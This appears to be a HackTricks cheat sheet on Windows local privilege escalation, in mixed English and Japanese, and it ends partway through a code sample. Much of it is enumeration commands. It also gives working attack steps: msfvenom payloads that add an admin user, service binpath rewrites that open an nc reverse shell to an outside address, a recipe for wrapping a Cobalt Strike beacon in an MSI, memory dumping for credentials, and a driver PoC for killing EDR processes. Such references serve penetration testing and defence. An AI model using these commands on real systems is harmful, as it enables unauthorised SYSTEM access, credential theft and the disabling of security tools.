# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**If you don't know what are Windows Access Tokens, read the following page before continuing:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Check the following page for more info about ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**If you don't know what are integrity levels in Windows you should read the following page before continuing:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows には、**システムの列挙を妨げる**、実行ファイルの実行を阻止する、あるいは**あなたの活動を検知する**などの様々な制御があります。privilege escalation の列挙を開始する前に、次の**ページ**を**読み**、これらすべての**防御****メカニズム**を**列挙**してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## System Info

### Version info enumeration

Check if the Windows version has any known vulnerability (check also the patches applied).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### バージョンエクスプロイト

この [site](https://msrc.microsoft.com/update-guide/vulnerability) は、Microsoft のセキュリティ脆弱性に関する詳細情報を検索するのに便利です。このデータベースには4,700件以上の脆弱性があり、Windows 環境が持つ **膨大な攻撃対象面** を示しています。

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github のエクスプロイト用リポジトリ:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

資格情報/Juicy 情報が env variables に保存されていますか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell の履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell のトランスクリプトファイル

有効化方法は [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) を参照してください。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShellのパイプライン実行の詳細が記録され、実行されたコマンド、コマンドの呼び出し、およびスクリプトの一部が含まれます。ただし、実行の完全な詳細や出力結果は必ずしも記録されない場合があります。

これを有効にするには、ドキュメントの「Transcript files」セクションの指示に従い、**"Module Logging"** を **"Powershell Transcription"** の代わりに選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell ログの直近15件のイベントを表示するには、次を実行します:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行に関する完全なアクティビティと全内容の記録が取得され、コードの各ブロックが実行時に逐一記録されることが保証されます。このプロセスは各アクティビティの包括的な監査証跡を保持し、フォレンジックや悪意のある挙動の解析に有用です。実行時のすべての操作を記録することで、プロセスに関する詳細な洞察が提供されます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のログイベントは Windows Event Viewer のパスにあります: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
最後の20件のイベントを表示するには、次を使用できます:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新が http**S** ではなく http で要求されている場合、システムを compromise できます。

まず、ネットワークが non-SSL WSUS update を使用しているか確認するには、cmd で次のコマンドを実行します:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または、PowerShellで次のように:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような返信があった場合：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

この脆弱性を悪用するには、[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS](https://github.com/GoSecure/pywsus) のようなツールを使用できます。これらは MiTM を利用したエクスプロイトスクリプトで、非SSL の WSUS トラフィックに 'fake' な更新を注入します。

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

> ローカルユーザのプロキシを変更できる権限があり、Windows Update が Internet Explorer の設定で構成されたプロキシを使用している場合、ローカルで [PyWSUS](https://github.com/GoSecure/pywsus) を実行して自分のトラフィックを傍受し、エレベーテッドユーザとしてコードを実行することが可能になります。
>
> さらに、WSUS サービスは現在のユーザの設定を使用するため、その証明書ストアも使用します。WSUS ホスト名用に自己署名証明書を生成し、それを現在のユーザの証明書ストアに追加すれば、HTTP および HTTPS の両方の WSUS トラフィックを傍受できます。WSUS は証明書に対して trust-on-first-use 的な検証を行う HSTS のような仕組みを持っていません。提示された証明書がユーザにより信頼され、ホスト名が正しければ、サービスはそれを受け入れます。

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

多くのエンタープライズエージェントは localhost の IPC インターフェースと特権付きのアップデートチャネルを公開しています。登録処理を攻撃者サーバに誘導でき、かつアップデータが不正なルートCA や弱い署名検証を信用する場合、ローカルユーザは SYSTEM サービスがインストールする悪意のある MSI を配布できます。一般化した手法（Netskope stAgentSvc チェーン – CVE-2025-0309 をベース）はこちらを参照してください:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.

エクスプロイトは次で入手できます: [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

攻撃のフローについての詳細は次を参照してください: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

レジストリのこれら 2 つの値が有効（value が **0x1**）になっている場合、あらゆる権限のユーザが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** としてインストール（実行）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使用して、カレントディレクトリ内に権限昇格用の Windows MSI バイナリを作成します。 このスクリプトはユーザー/グループ追加を促すプリコンパイル済みの MSI インストーラを書き出します（そのため GIU アクセスが必要です）:
```
Write-UserAddMSI
```
作成したバイナリを実行するだけで権限を昇格できます。

### MSI Wrapper

このチュートリアルを読んで、これらのツールを使ってMSI Wrapperを作成する方法を学んでください。**.bat** ファイルをラップすれば、**単に** **コマンドライン** を**実行**したい場合にも使えます。


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- **Visual Studio** を開き、**Create a new project** を選択して検索ボックスに "installer" と入力します。**Setup Wizard** プロジェクトを選んで **Next** をクリックします。
- プロジェクト名に **AlwaysPrivesc** のような名前を付け、場所は **`C:\privesc`** を使い、**place solution and project in the same directory** を選択して **Create** をクリックします。
- **Next** をクリックし続けて 4 ステップ中の 3 (choose files to include) に到達するまで進めます。**Add** をクリックして、先ほど生成した Beacon payload を選択し、**Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
- **Author** や **Manufacturer** のような他のプロパティを変更することもでき、インストールされるアプリをより正当らしく見せることができます。
- プロジェクトを右クリックして **View > Custom Actions** を選択します。
- **Install** を右クリックして **Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** ファイルを選択して **OK** をクリックします。これによりインストーラ実行時に beacon payload がすぐに実行されるようになります。
- **Custom Action Properties** の下で **Run64Bit** を **True** に変更します。
- 最後に、**ビルドします**。
- 警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` が表示された場合、プラットフォームを x64 に設定していることを確認してください。

### MSI Installation

悪意のある `.msi` ファイルの**インストール**を**バックグラウンド**で実行するには:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには次を使用できます: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

これらの設定は何が**記録されるか**を決定するので、注意を払う必要があります
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding は、ログがどこに送信されているかを確認しておくとよいです。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は **management of local Administrator passwords** のために設計されており、ドメインに参加しているコンピュータ上で各パスワードが **unique, randomised, and regularly updated** になることを保証します。これらのパスワードは Active Directory に安全に保存され、ACLs を通じて十分な権限が付与されたユーザーのみがアクセスでき、許可されていれば local admin passwords を参照できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効になっている場合、**plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する保護を強化し、信頼されていないプロセスによる **read its memory** や inject code の試みを **block** することでシステムをさらに保護します。\  
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection)
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。目的はデバイスに保存されている資格情報を pass-the-hash のような脅威から保護することです。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### キャッシュされた資格情報

**ドメイン資格情報** は **Local Security Authority (LSA)** によって認証され、OS コンポーネントによって利用されます。ユーザーのログオンデータが登録されたセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
[**キャッシュされた資格情報に関する詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループの列挙

自分が所属するグループに興味深い権限がないか確認してください。
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

**もしあなたが特権グループの一員であれば、権限昇格できる可能性があります。** 特権グループと、それらを悪用して権限昇格する方法についてはここを参照してください：


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### トークン操作

**詳しくは**このページで**トークン**が何かを確認してください: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
以下のページを確認して、**注目すべきトークン**とそれらの悪用方法を学んでください：


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログオン中のユーザー / セッション
```bash
qwinsta
klist sessions
```
### ホームフォルダ
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダの権限

まず、プロセスを一覧表示して、プロセスのコマンドライン内に**パスワードが含まれていないか確認する**。\
**overwrite some binary running**できるか、またはbinary folderに書き込み権限があるか確認し、可能なら[**DLL Hijacking attacks**](dll-hijacking/index.html)を悪用する:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に[**electron/cef/chromium debuggers**が実行されていないか確認してください、権限昇格に悪用できる可能性があります](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**プロセスのバイナリの権限を確認する**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリが配置されているフォルダの権限を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### メモリからのパスワード抽出

実行中のプロセスのメモリダンプは sysinternals の **procdump** を使って作成できます。FTP のようなサービスはメモリ内に **credentials が平文で存在する** ことがあるので、メモリをダンプして credentials を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 不安全な GUI アプリ

**SYSTEM として実行されるアプリケーションは、ユーザーに CMD を起動させたりディレクトリを参照させたりすることがあります。**

例: "Windows Help and Support"（Windows + F1）で "command prompt" を検索し、"Click to open Command Prompt" をクリック

## サービス

Service Triggers は、特定の条件が発生したときに Windows がサービスを起動できるようにします（named pipe/RPC endpoint のアクティビティ、ETW イベント、IP 利用可能性、デバイス接続、GPO リフレッシュ等）。SERVICE_START 権限がなくても、トリガーを発動することで特権サービスを起動できることが多いです。列挙および起動手法は以下を参照してください:

-
{{#ref}}
service-triggers.md
{{#endref}}

サービスの一覧を取得する:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

サービスの情報を取得するために **sc** を使用できます
```bash
sc qc <service_name>
```
各サービスに必要な権限レベルを確認するために、_Sysinternals_ のバイナリ **accesschk** を用意しておくことを推奨します。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
「Authenticated Users」が任意のサービスを変更できるかどうか確認することを推奨します:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

（例えば SSDPSRV で）次のエラーが発生する場合:

_システム エラー 1058 が発生しました._\
_サービスを開始できません。サービスが無効になっているか、関連付けられた有効なデバイスがないためです._

次のコマンドで有効にできます。
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**サービス upnphost は動作するために SSDPSRV に依存していることに注意してください (XP SP1 向け)**

**この問題の別の回避策** は次を実行することです:
```
sc.exe config usosvc start= auto
```
### **サービスのバイナリパスを変更する**

「Authenticated users」グループが service に対して **SERVICE_ALL_ACCESS** を持っている場合、service の executable binary を変更することが可能です。変更して実行するには **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスの再起動
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
権限は次のような様々な権限を通じて昇格できます:

- **SERVICE_CHANGE_CONFIG**: サービスのバイナリを再構成できるようになります。
- **WRITE_DAC**: 権限の再構成を可能にし、サービス構成の変更につながります。
- **WRITE_OWNER**: 所有権の取得と権限の再構成を許可します。
- **GENERIC_WRITE**: サービス構成を変更する能力を継承します。
- **GENERIC_ALL**: 同様にサービス構成を変更する能力を継承します。

この脆弱性の検出と悪用には _exploit/windows/local/service_permissions_ を利用できます。

### Services binaries weak permissions

**サービスによって実行されるバイナリを変更できるかを確認する** または バイナリが配置されているフォルダに **書き込み権限があるかを確認する** ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
サービスによって実行されるすべてのバイナリは **wmic** を使用して取得でき（system32内ではない）、権限は **icacls** で確認できます:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
また、**sc** と **icacls** を使用することもできます:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### サービスレジストリの変更権限

任意のサービスレジストリを変更できるか確認する必要があります.\\
次のようにサービス**レジストリ**に対する**権限**を**確認**できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
サービスの実行バイナリに対して、**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているか確認する必要があります。もしそうであれば、サービスが実行するバイナリを改変できます。

実行されるバイナリの Path を変更するには：
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

このレジストリに対してこの権限を持っている場合、つまり **このレジストリからサブレジストリを作成できる** ことを意味します。Windowsのサービスの場合、これは **任意のコードを実行するのに十分です：**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルへのパスが引用符で囲まれていない場合、Windowsはスペースの前までの各パス候補を順に実行しようとします。

例えば、パス _C:\Program Files\Some Folder\Service.exe_ の場合、Windowsは次の順に実行を試みます：
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みの Windows サービスに属するものを除き、引用符で囲まれていないサービスのパスをすべて列挙する:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**この脆弱性を検出およびexploit**するには metasploit: `exploit/windows/local/trusted_service_path` を使用できます。metasploit を使って手動でサービスバイナリを作成することもできます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 回復アクション

Windowsでは、サービスが失敗した場合に実行するアクションを指定できます。この機能は特定の binary を指すように設定できます。もしこの binary が置き換え可能であれば、privilege escalation が可能になることがあります。詳細は[official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)を参照してください。

## アプリケーション

### インストール済みのアプリケーション

**permissions of the binaries** と **folders** を確認してください（上書きできれば privilege escalation が可能かもしれません）。([DLL Hijacking](dll-hijacking/index.html))
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

config file を変更して特定のファイルを読み取れるか、または Administrator account（schedtasks）によって実行される binary を変更できるかを確認してください。

システム上で脆弱なフォルダ/ファイルの権限を見つける方法の一つは、次のように実行することです:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### 起動時に実行

**別のユーザによって実行されるレジストリやバイナリを上書きできないか確認する。**\
**次のページ**を読んで、興味深い **autoruns locations to escalate privileges** について詳しく学んでください。


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバ

可能性のある **サードパーティの怪しい/脆弱な** ドライバを探す
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### device objects における FILE_DEVICE_SECURE_OPEN の欠落の悪用 (LPE + EDR kill)

一部の署名されたサードパーティドライバは、IoCreateDeviceSecure を使って強力な SDDL でデバイスオブジェクトを作成するが、DeviceCharacteristics に FILE_DEVICE_SECURE_OPEN を設定し忘れることがある。このフラグがないと、追加のコンポーネントを含んだパス経由でデバイスがオープンされた場合に secure DACL が適用されず、未特権ユーザが以下のような名前空間パスを使ってハンドルを取得できる:

- \\.\DeviceName\anything
- \\.\amsdk\anyfile (from a real-world case)

ユーザがデバイスをオープンできるようになると、ドライバが公開する特権的な IOCTLs を悪用して LPE や改ざんが可能になる。実際に確認された機能の例:
- 任意プロセスに対してフルアクセスのハンドルを返す（token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser）。
- 制限のない raw disk read/write（オフライン改ざん、ブート時持続化トリック）。
- Protected Process/Light (PP/PPL) を含む任意のプロセスを終了させることが可能で、これによりカーネル経由でユーザランドからの AV/EDR kill が可能になる。

最小限の PoC パターン (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
